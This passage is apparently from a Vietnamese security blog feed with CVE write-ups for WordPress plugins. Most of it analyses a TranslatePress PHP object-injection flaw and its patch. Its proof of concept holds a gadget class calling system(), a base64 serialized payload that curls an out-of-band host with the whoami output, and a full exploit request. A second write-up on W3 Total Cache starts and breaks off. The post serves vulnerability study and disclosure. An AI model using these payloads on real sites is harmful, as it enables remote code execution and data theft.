tr·ªçng:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Nguy c∆° Object Injection&lt;/strong&gt;: N·∫øu attacker ch√®n payload PHP object v√†o d·ªØ li·ªáu base64, qu√° tr√¨nh decode v√† unserialize s·∫Ω kh·ªüi t·∫°o object ƒë·ªôc h·∫°i, d·∫´n ƒë·∫øn &lt;strong&gt;Object Injection&lt;/strong&gt; v√† c√≥ kh·∫£ nƒÉng ti·∫øn t·ªõi &lt;strong&gt;Remote Code Execution (RCE)&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Thi·∫øu ki·ªÉm tra an to√†n&lt;/strong&gt;: Kh√¥ng c√≥ b∆∞·ªõc x√°c th·ª±c d·ªØ li·ªáu tr∆∞·ªõc khi th·ª±c hi·ªán unserialize.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Kh√¥ng c√≥ c∆° ch·∫ø fallback&lt;/strong&gt;: N·∫øu d·ªØ li·ªáu kh√¥ng h·ª£p l·ªá ho·∫∑c b·ªã l·ªói, h·ªá th·ªëng kh√¥ng c√≥ ph∆∞∆°ng √°n x·ª≠ l√Ω thay th·∫ø, khi·∫øn ·ª©ng d·ª•ng d·ªÖ b·ªã khai th√°c.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;B·∫£n v√° (v2.9.7):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-23-cve-2025-30773/diff.png&#34; title=&#34;S·ª± thay ƒë·ªïi c·ªßa b·∫£n v√°&#34; data-thumbnail=&#34;/posts/2025-11-23-cve-2025-30773/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;S·ª± thay ƒë·ªïi c·ªßa b·∫£n v√°&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-23-cve-2025-30773/diff.png&#39; alt=&#34;Diff&#34; height=&#34;278&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;S·ª± thay ƒë·ªïi c·ªßa b·∫£n v√°&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Thay th·∫ø &lt;code&gt;unserialize()&lt;/code&gt; b·∫±ng &lt;code&gt;json_decode()&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;p&gt;Kh√¥ng c√≤n d√πng &lt;code&gt;unserialize()&lt;/code&gt; ‚Üí lo·∫°i b·ªè ho√†n to√†n kh·∫£ nƒÉng &lt;code&gt;PHP Object Injection&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;H√†m &lt;code&gt;trp_update_database()&lt;/code&gt; ki·ªÉm tra xem ng∆∞·ªùi d√πng hi·ªán t·∫°i c√≥ ph·∫£i Administrator th√¥ng qua:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! current_user_can( apply_filters(&amp;#39;trp_update_database_capability&amp;#39;, &amp;#39;manage_options&amp;#39;) ) ){&#xA;    $this-&amp;gt;stop_and_print_error( __(&amp;#39;Update aborted! Your user account doesn\&amp;#39;t have the capability to perform database updates.&amp;#39;, &amp;#39;translatepress-multilingual&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ƒê·ªìng th·ªùi, h√†m c≈©ng x√°c th·ª±c &lt;code&gt;nonce&lt;/code&gt; ƒë·ªÉ ngƒÉn ch·∫∑n CSRF:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$nonce = isset( $_REQUEST[&amp;#39;trp_updb_nonce&amp;#39;] ) ? wp_verify_nonce( sanitize_text_field( $_REQUEST[&amp;#39;trp_updb_nonce&amp;#39;] ), &amp;#39;tpupdatedatabase&amp;#39; ) : false;&#xA;if ( $nonce === false ){&#xA;    $this-&amp;gt;stop_and_print_error( __(&amp;#39;Update aborted! Invalid nonce.&amp;#39;, &amp;#39;translatepress-multilingual&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong tr∆∞·ªùng h·ª£p kh√¥ng c√≥ &lt;code&gt;nonce&lt;/code&gt;, l·ªó h·ªïng c√≥ th·ªÉ b·ªã khai th√°c b·ªüi Unauthenticated khi admin b·ªã d·ª• truy c·∫≠p v√†o trang c·ªßa attacker, t·ª´ ƒë√≥ tr√¨nh duy·ªát g·ª≠i request k√®m cookie c·ªßa admin, quy·ªÅn &lt;code&gt;manage_options&lt;/code&gt; lu√¥n t·ªìn t·∫°i v√† c√°c logic ph√≠a sau s·∫Ω ƒë∆∞·ª£c th·ª±c thi.&lt;/p&gt;&#xA;&lt;p&gt;Khi search v·ªõi t√™n h√†m &lt;code&gt;trp_update_database&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-23-cve-2025-30773/search.png&#34; title=&#34;K·∫øt qu·∫£ search trp_update_database&#34; data-thumbnail=&#34;/posts/2025-11-23-cve-2025-30773/search.png&#34; data-sub-html=&#34;&lt;h2&gt;Search&lt;/h2&gt;&lt;p&gt;K·∫øt qu·∫£ search trp_update_database&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-23-cve-2025-30773/search.png&#39; alt=&#34;Search&#34; height=&#34;537&#34; width=&#34;1260&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;K·∫øt qu·∫£ search trp_update_database&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;trp_update_database&lt;/code&gt; ƒë∆∞·ª£c ƒë·∫∑t l√†m gi√° tr·ªã cho param &lt;code&gt;page&lt;/code&gt; =&amp;gt; &lt;code&gt;trp_update_database&lt;/code&gt; l√† callback v√† s·∫Ω ƒë∆∞·ª£c g·ªçi khi truy c·∫≠p &lt;code&gt;/wp-admin/admin.php?page=trp_update_database&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;&#xA;A[&amp;#34;Administrator visits /wp-admin/admin.php?page=trp_update_database&amp;#34;] --&amp;gt; B[&amp;#34;trp_update_database() invoked&amp;#34;]&#xA;&#xA;B --&amp;gt; C{&amp;#34;Check capability: current_user_can(manage_options)&amp;#34;}&#xA;C --&amp;gt;|Fail| X[&amp;#34;Stop &amp;amp; print error: insufficient privilege&amp;#34;]&#xA;C --&amp;gt;|Pass| D[&amp;#34;Verify nonce: wp_verify_nonce()&amp;#34;]&#xA;&#xA;D --&amp;gt;|Fail| Y[&amp;#34;Stop &amp;amp; print error: Invalid nonce&amp;#34;]&#xA;D --&amp;gt;|Pass| E[&amp;#34;Read trp_updb_extra_params&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;base64_decode()&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;unserialize()&amp;#34;]&#xA;&#xA;G --&amp;gt; H{&amp;#34;Is payload malicious?&amp;#34;}&#xA;H --&amp;gt;|Yes| R[&amp;#34;Object Injection ‚Üí Code Execution (RCE)&amp;#34;]&#xA;H --&amp;gt;|No| S[&amp;#34;Continue update process normally&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;T·∫°o class ƒë·ªÉ test ƒë·∫∑t trong &lt;code&gt;wp-config.php&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;class Evil&#xA;{&#xA;    public $command = &amp;#34;ls /&amp;#34;;&#xA;    public function __destruct()&#xA;    {&#xA;        die(system($this-&amp;gt;command));&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Cho request ƒëi qua proxy c·ªßa BurpSuite&lt;/li&gt;&#xA;&lt;li&gt;G·ª≠i l·∫°i request v·ªõi trp_updb_extra_params ch·ª©a chu·ªói serialized ƒë∆∞·ª£c encode base64&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;trp_updb_extra_params = base64_encode(&amp;#39;O:4:&amp;#34;Evil&amp;#34;:1:{s:7:&amp;#34;command&amp;#34;;s:75:&amp;#34;curl http://p8ye6bo0snakjfntwfcv7zvcz35utkh9.oastify.com/?leadked=$(whoami)&amp;#34;;}&amp;#39;)&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;Cookie: administrator_cookie&#xA;...&#xA;&#xA;action=trp_update_database&amp;amp;trp_updb_nonce=808dff22f9&amp;amp;initiate_update=true&amp;amp;trp_updb_extra_params=Tzo0OiJFdmlsIjoxOntzOjc6ImNvbW1hbmQiO3M6NzU6ImN1cmwgaHR0cDovL3A4eWU2Ym8wc25ha2pmbnR3ZmN2N3p2Y3ozNXV0a2g5Lm9hc3RpZnkuY29tLz9sZWFka2VkPSQod2hvYW1pKSI7fQ==&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-23-cve-2025-30773/result.png&#34; title=&#34;K·∫øt qu·∫£&#34; data-thumbnail=&#34;/posts/2025-11-23-cve-2025-30773/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;K·∫øt qu·∫£&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-23-cve-2025-30773/result.png&#39; alt=&#34;Result&#34; height=&#34;379&#34; width=&#34;1073&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;K·∫øt qu·∫£&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;p&gt;L·ªó h·ªïng xu·∫•t ph√°t t·ª´ vi·ªác &lt;code&gt;unserialize()&lt;/code&gt; ƒë∆∞·ª£c s·ª≠ d·ª•ng tr·ª±c ti·∫øp tr√™n d·ªØ li·ªáu ng∆∞·ªùi d√πng m√† kh√¥ng c√≥ x√°c th·ª±c b·ªï sung, t·∫°o ƒëi·ªÅu ki·ªán cho vi·ªác kh·ªüi t·∫°o ƒë·ªëi t∆∞·ª£ng t√πy √Ω v√† d·∫´n ƒë·∫øn th·ª±c thi m√£ t·ª´ xa n·∫øu payload ƒë·ªôc h·∫°i ƒë∆∞·ª£c cung c·∫•p. Khi k·∫øt h·ª£p v·ªõi kh·∫£ nƒÉng khai th√°c CSRF, admin c√≥ th·ªÉ b·ªã l·ª´a th·ª±c thi payload theo √Ω attacker. Vi·ªác chuy·ªÉn sang &lt;code&gt;json_decode()&lt;/code&gt; trong b·∫£n v√° 2.9.7 lo·∫°i b·ªè ho√†n to√†n b·ªÅ m·∫∑t t·∫•n c√¥ng n√†y v√† gi·∫£i quy·∫øt tri·ªát ƒë·ªÉ l·ªó h·ªïng.&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;unserialize()&lt;/code&gt; tr√™n d·ªØ li·ªáu kh√¥ng tin c·∫≠y lu√¥n mang r·ªßi ro Object Injection v√† c√≥ th·ªÉ d·∫´n t·ªõi RCE.&lt;/li&gt;&#xA;&lt;li&gt;C·∫ßn x√°c th·ª±c v√† ki·ªÉm so√°t ch·∫∑t ch·∫Ω d·ªØ li·ªáu ng∆∞·ªùi d√πng tr∆∞·ªõc khi x·ª≠ l√Ω.&lt;/li&gt;&#xA;&lt;li&gt;CSRF c√≥ th·ªÉ n√¢ng r·ªßi ro t·ª´ ‚ÄúAuthenticated exploit‚Äù th√†nh ‚ÄúSilent exploitation‚Äù.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;json_decode()&lt;/code&gt; l√† l·ª±a ch·ªçn an to√†n h∆°n cho trao ƒë·ªïi d·ªØ li·ªáu gi·ªØa client v√† server.&lt;/li&gt;&#xA;&lt;li&gt;Ki·ªÉm tra diff gi·ªØa b·∫£n l·ªói v√† b·∫£n v√° gi√∫p nhanh ch√≥ng x√°c ƒë·ªãnh nguy√™n nh√¢n v√† ph∆∞∆°ng ph√°p kh·∫Øc ph·ª•c.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Deserialization&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/translatepress-multilingual/vulnerability/wordpress-translatepress-2-9-6-php-object-injection-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress TranslatePress Plugin &amp;lt;= 2.9.6 is vulnerable to PHP Object Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-9501 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-11-22-cve-2025-9501/</link>
      <pubDate>Sat, 22 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-11-22-cve-2025-9501/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-22-cve-2025-9501/app.jpg&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin W3 Total Cache WordPress tr∆∞·ªõc phi√™n b·∫£n 2.8.13 t·ªìn t·∫°i l·ªó h·ªïng command injection th√¥ng qua h√†m _parse_dynamic_mfunc, cho ph√©p ng∆∞·ªùi d√πng ch∆∞a x√°c th·ª±c th·ª±c thi c√°c l·ªánh PHP b·∫±ng c√°ch g·ª≠i m·ªôt comment ch·ª©a payload ƒë·ªôc h·∫°i v√†o b√†i vi·∫øt.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-9501&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-9501&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: PHP Object Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.8.12&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.8.13&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/w3-total-cache/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress W3 Total Cache Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;W3 Total Cache&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;2.8.12&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;2.8.13&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 